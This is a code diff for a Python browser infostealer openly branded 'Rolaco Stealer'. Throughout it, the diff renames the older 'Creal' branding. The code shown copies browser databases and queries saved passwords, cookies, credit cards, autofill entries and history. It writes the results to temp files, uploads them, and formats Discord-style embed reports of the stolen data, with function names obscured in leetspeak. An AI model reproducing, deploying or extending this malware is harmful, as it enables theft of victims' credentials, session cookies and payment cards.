@@ -560,7 +560,7 @@ def UP104D(name, link):
         return
 
 def Wr173F0rF113(data, name):
-    path = os.getenv("TEMP") + f"\cr{name}.txt"
+    path = os.getenv("TEMP") + f"\RolacoStealer{name}.txt"
     with open(path, mode='w', encoding='utf-8') as f:
         for line in data:
             if line[0] != '':
@@ -601,7 +601,7 @@ def G37P455W(path, arg):
         pathC = path + arg + "/Login Data"
         if os.stat(pathC).st_size == 0: return
 
-        tempfold = temp + "cr" + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for i in range(8)) + ".db"
+        tempfold = temp + "RolacoStealer" + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for i in range(8)) + ".db"
 
         data = SQ17H1N6(pathC, tempfold, "SELECT action_url, username_value, password_value FROM logins;")
 
@@ -632,7 +632,7 @@ def G37C00K13(path, arg):
         pathC = path + arg + "/Cookies"
         if os.stat(pathC).st_size == 0: return
 
-        tempfold = temp + "cr" + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for i in range(8)) + ".db"
+        tempfold = temp + "RolacoStealer" + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for i in range(8)) + ".db"
 
         data = SQ17H1N6(pathC, tempfold, "SELECT host_key, name, encrypted_value FROM cookies ")
 
@@ -664,7 +664,7 @@ def G37CC5(path, arg):
         pathC = path + arg + "/Web Data"
         if os.stat(pathC).st_size == 0: return
 
-        tempfold = temp + "cr" + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for i in range(8)) + ".db"
+        tempfold = temp + "RolacoStealer" + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for i in range(8)) + ".db"
 
         data = SQ17H1N6(pathC, tempfold, "SELECT * FROM credit_cards ")
 
@@ -688,7 +688,7 @@ def G374U70F111(path, arg):
         pathC = path + arg + "/Web Data"
         if os.stat(pathC).st_size == 0: return
 
-        tempfold = temp + "cr" + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for i in range(8)) + ".db"
+        tempfold = temp + "RolacoStealer" + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for i in range(8)) + ".db"
 
         data = SQ17H1N6(pathC, tempfold,"SELECT * FROM autofill WHERE value NOT NULL")
 
@@ -706,7 +706,7 @@ def G37H1570rY(path, arg):
 
         pathC = path + arg + "History"
         if os.stat(pathC).st_size == 0: return
-        tempfold = temp + "cr" + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for i in range(8)) + ".db"
+        tempfold = temp + "RolacoStealer" + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for i in range(8)) + ".db"
         data = SQ17H1N6(pathC, tempfold,"SELECT * FROM urls")
 
         for row in data:
@@ -765,7 +765,7 @@ def G378r0W53r5(br0W53rP47H5):
     if TrU57(C00K13s) == True: __import__('sys').exit(0)
     for thread in Browserthread: thread.join()
 
-    for file in ["crpasswords.txt", "crcookies.txt", "crcreditcards.txt", "crautofills.txt", "crhistories.txt", "crbookmarks.txt"]:
+    for file in ["RolacoStealerpasswords.txt", "RolacoStealercookies.txt", "RolacoStealercreditcards.txt", "RolacoStealerautofills.txt", "RolacoStealerhistories.txt", "RolacoStealerbookmarks.txt"]:
         filess.append(UP104D7060F113(os.getenv("TEMP") + "\\" + file))
     headers = {"Content-Type": "application/json","User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"}
 
@@ -774,21 +774,21 @@ def G378r0W53r5(br0W53rP47H5):
         "embeds": [
             {
                 "title": f"Rolaco Stealer | Password Stealer",
-                "description": f"**Found**:\n{G37W3851735(p45WW0rDs)}\n\n**Data:**\n<a:hira_kasaanahtari:886942856969875476> • **{P455WC0UNt}** Passwords Found\n<a:CH_IconArrowRight:715585320178941993> • [CrealPasswords.txt]({filess[0]})",
+                "description": f"**Found**:\n{G37W3851735(p45WW0rDs)}\n\n**Data:**\n<a:hira_kasaanahtari:886942856969875476> • **{P455WC0UNt}** Passwords Found\n<a:CH_IconArrowRight:715585320178941993> • [RolacoPasswords.txt]({filess[0]})",
                 "color": 2895667,
                 "footer": {"text": f"Rolaco Stealer",  
                 "icon_url": ""https://raw.githubusercontent.com/Rolaco0/RolacoStealer/main/img/rolaco.png""}
             },
             {
                 "title": f"Rolaco Stealer | Cookies Stealer",
-                "description": f"**Found**:\n{G37W3851735(c00K1W0rDs)}\n\n**Data:**\n<:cookies_tlm:816619063618568234> • **{C00K1C0UNt}** Cookies Found\n<a:CH_IconArrowRight:715585320178941993> • [CrealCookies.txt]({filess[1]})",
+                "description": f"**Found**:\n{G37W3851735(c00K1W0rDs)}\n\n**Data:**\n<:cookies_tlm:816619063618568234> • **{C00K1C0UNt}** Cookies Found\n<a:CH_IconArrowRight:715585320178941993> • [RolacoCookies.txt]({filess[1]})",
                 "color": 2895667,
                 "footer": {"text": f"Rolaco Stealer",  
                 "icon_url": ""https://raw.githubusercontent.com/Rolaco0/RolacoStealer/main/img/rolaco.png""}
             },
             {
                 "title": f"Rolaco Stealer | Browser Data",
-                "description": f":newspaper:  • **{H1570rYC0UNt}** Histories Found\n<a:CH_IconArrowRight:715585320178941993> • [CrealHistories.txt]({filess[4]})\n\n<a:hira_kasaanahtari:886942856969875476> • **{AU70F111C0UNt}** Autofills Found\n<a:CH_IconArrowRight:715585320178941993> • [CrealAutofills.txt]({filess[3]})\n\n<a:4394_cc_creditcard_cartao_f4bihy:755218296801984553> • **{CC5C0UNt}** Credit Cards Found\n<a:CH_IconArrowRight:715585320178941993> • [CrealCreditCards.txt]({filess[2]})\n\n:bookmark: • **{B00KM4rK5C0UNt}** Bookmarks Found\n<a:CH_IconArrowRight:715585320178941993> • [CrealBookmarks.txt]({filess[5]})",
+                "description": f":newspaper:  • **{H1570rYC0UNt}** Histories Found\n<a:CH_IconArrowRight:715585320178941993> • [RolacoHistories.txt]({filess[4]})\n\n<a:hira_kasaanahtari:886942856969875476> • **{AU70F111C0UNt}** Autofills Found\n<a:CH_IconArrowRight:715585320178941993> • [RolacoAutofills.txt]({filess[3]})\n\n<a:4394_cc_creditcard_cartao_f4bihy:755218296801984553> • **{CC5C0UNt}** Credit Cards Found\n<a:CH_IconArrowRight:715585320178941993> • [RolacoCreditCards.txt]({filess[2]})\n\n:bookmark: • **{B00KM4rK5C0UNt}** Bookmarks Found\n<a:CH_IconArrowRight:715585320178941993> • [RolacoBookmarks.txt]({filess[5]})",
                 "color": 2895667,
                 "footer": {"text": f"Rolaco Stealer",  
                 "icon_url": ""https://raw.githubusercontent.com/Rolaco0/RolacoStealer/main/img/rolaco.png""}
